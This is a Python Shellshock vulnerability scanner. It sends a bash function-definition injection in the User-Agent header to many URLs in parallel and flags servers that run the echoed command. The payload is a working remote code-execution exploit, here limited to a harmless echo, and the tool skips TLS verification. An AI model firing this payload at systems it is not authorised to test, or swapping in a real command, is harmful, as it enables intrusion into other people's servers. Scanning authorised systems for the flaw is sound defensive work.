#!/usr/bin/env python3

import sys
import requests
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.exceptions import InsecureRequestWarning
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich import print as rprint
from rich.logging import RichHandler
import argparse
import json
from typing import List, Tuple, Optional, Dict
import os
from rich.tree import Tree
from rich.syntax import Syntax
from datetime import datetime

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Configuração do logger
logging.basicConfig(
    level="INFO",
    format="%(message)s",
    datefmt="[%X]",
    handlers=[RichHandler(rich_tracebacks=True)]
)

logger = logging.getLogger("shellshock_tester")
console = Console()

def test_shellshock(url: str, progress: Progress, task_id: int) -> Tuple[str, Optional[bool], Optional[str]]:
    
    headers = {
        "User-Agent": "() { :; }; echo; echo; /bin/bash -c 'echo VULNERABLE'",
        "Accept": "*/*"
    }
    
    try:
        response = requests.get(url, headers=headers, timeout=10, verify=False, allow_redirects=False)
        progress.update(task_id, advance=1)
        is_vulnerable = "VULNERABLE" in response.text
        details = f"Status Code: {response.status_code}, Content Length: {len(response.text)}"
        return url, is_vulnerable, details
    except requests.RequestException as e:
        logger.error(f"Error testing {url}: {str(e)}")
        progress.update(task_id, advance=1)
        return url, None, str(e)

def main(urls: List[str], threads: int) -> List[Tuple[str, Optional[bool], Optional[str]]]:
    
    results = []
    total_urls = len(urls)
    
    progress = Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TextColumn("[progress.completed]{task.completed}/{task.total}"),
    )
    
    with progress:
        task_id = progress.add_task("[cyan]Testing URLs...", total=total_urls)
        with ThreadPoolExecutor(max_workers=threads) as executor:
            future_to_url = {executor.submit(test_shellshock, url, progress, task_id): url for url in urls}
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    result = future.result()
                    results.append(result)
                except Exception as e:
                    logger.error(f"[ERROR] An exception occurred while processing {url}: {str(e)}")
    
    return results

def display_results(results: List[Tuple[str, Optional[bool], Optional[str]]]) -> None:
    
    table = Table(title="🌐 Shellshock Test Results", show_header=True, header_style="bold magenta")
    table.add_column("URL", style="cyan", no_wrap=True)
    table.add_column("Status", style="green")
    table.add_column("Details", style="yellow")

    for url, is_vulnerable, details in results:
        status = "Vulnerable" if is_vulnerable is True else "Not Vulnerable" if is_vulnerable is False else "Error"
        table.add_row(url, status, details)
    
    console.print(table)

def save_results(results: List[Tuple[str, Optional[bool], Optional[str]]], filename: str) -> None:
    
    results_dict = {
        url: {
            "status": "Vulnerable" if is_vulnerable else "Not Vulnerable" if is_vulnerable is False else "Error",
            "details": details
        } for url, is_vulnerable, details in results
    }
    with open(filename, "w") as f:
        json.dump(results_dict, f, indent=2)
    console.print(f"[bold green]Results saved to {filename}[/bold green]")

def load_urls_from_file(filename: str) -> List[str]:
    
    with open(filename, "r") as f:
        return [line.strip() for line in f if line.strip()]

def parse_arguments() -> argparse.Namespace:
    
    parser = argparse.ArgumentParser(description="Shellshock Vulnerability Tester")
    parser.add_argument("-u", "--urls", nargs="+", help="URLs to test")
    parser.add_argument("-f", "--file", help="File containing URLs to test")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads to use")
    parser.add_argument("-o", "--output", help="Output file name for results")
    return parser.parse_args()

def show_config(urls: List[str], threads: int, output: Optional[str]) -> None:
    
    config = {
        "URLs to test": len(urls),
        "Number of threads": threads,
        "Output file": output if output else "None"
    }
    console.print(Panel.fit(
        Syntax(json.dumps(config, indent=2), "json"),
        title="[bold]Configuration",
        border_style="green"
    ))

def main_menu() -> Dict:
    choices = {}
    
    choices['urls'] = Prompt.ask("Enter URLs to test (separated by space) or path to file")
    if os.path.isfile(choices['urls']):
        choices['urls'] = load_urls_from_file(choices['urls'])
    else:
        choices['urls'] = choices['urls'].split()
    
    choices['threads'] = int(Prompt.ask("Number of threads", default="5"))
    choices['output'] = Prompt.ask("Output file name (optional)", default="")
    
    return choices

if __name__ == "__main__":
    console.print(Panel.fit("[bold cyan]Shellshock Vulnerability Tester[/bold cyan]", border_style="blue"))
    
    args = parse_arguments()
    
    if args.urls or args.file:
        urls = args.urls if args.urls else load_urls_from_file(args.file)
        threads = args.threads
        output = args.output
    else:
        choices = main_menu()
        urls = choices['urls']
        threads = choices['threads']
        output = choices['output']

    if not urls:
        console.print("[bold red]No URLs provided. Exiting.[/bold red]")
        sys.exit(1)

    show_config(urls, threads, output)

    if Confirm.ask("Do you want to proceed with the test?"):
        start_time = datetime.now()
        results = main(urls, threads)
        end_time = datetime.now()
        
        console.print(f"\n[bold]Test completed in {end_time - start_time}[/bold]\n")
        
        display_results(results)
        
        if output:
            save_results(results, output)
        
        rprint("[bold blue]Test completed![/bold blue]")
    else:
        console.print("[bold yellow]Test cancelled.[/bold yellow]")
